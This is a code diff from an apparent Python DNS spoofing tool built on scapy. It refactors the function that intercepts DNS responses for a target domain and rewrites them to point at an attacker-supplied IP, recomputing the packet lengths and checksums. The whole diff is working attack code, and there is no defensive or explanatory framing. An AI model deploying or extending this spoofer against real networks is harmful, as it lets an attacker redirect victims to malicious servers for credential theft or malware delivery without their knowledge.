@@ -19,6 +19,16 @@ def get_parameters():
     return options
 
 
+def modify_packet(packet, answer):
+    packet[scapy.DNS].an = answer
+    packet[scapy.DNS].ancount = 1
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.UDP].len
+    del packet[scapy.UDP].chksum
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
@@ -27,12 +37,7 @@ def process_packet(packet):
         if options.domain in str(qname):
             print("[+] spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata=options.ip)
-            scapy_packet[scapy.DNS].an = answer
-            scapy_packet[scapy.DNS].ancount = 1
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.UDP].len
-            del scapy_packet[scapy.UDP].chksum
+            scapy_packet = modify_packet(scapy_packet, answer)
             packet.set_payload(bytes(scapy_packet))
     packet.accept()
 
